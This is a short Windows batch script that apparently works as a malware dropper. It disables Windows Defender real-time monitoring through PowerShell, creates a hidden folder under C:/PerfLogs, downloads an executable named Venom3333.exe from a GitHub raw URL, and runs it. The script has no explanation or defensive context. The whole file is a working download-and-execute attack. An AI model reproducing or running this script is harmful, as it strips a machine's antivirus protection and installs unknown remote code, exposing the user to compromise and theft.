start cmd.exe /k  "powershell -command Set-MpPreference -DisableRealtimeMonitoring $true;"
timeout /t 2

start cmd.exe /k  "powershell -command mkdir -p C:/PerfLogs/x;"
timeout /t 2

start cmd.exe /k  "powershell -command "$url = 'https://github.com/mortingenstrasse95/mng/raw/main/Venom3333.exe'; $output = 'C:/PerfLogs/x/Venom3333.exe'; $start_time = Get-Date; $wc = New-Object System.Net.WebClient; $wc.DownloadFile($url, $output); Write-Output 'Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)';"

timeout /t 10

start cmd.exe /k powershell -command "C:/PerfLogs/x/Venom3333.exe;"
timeout /t 10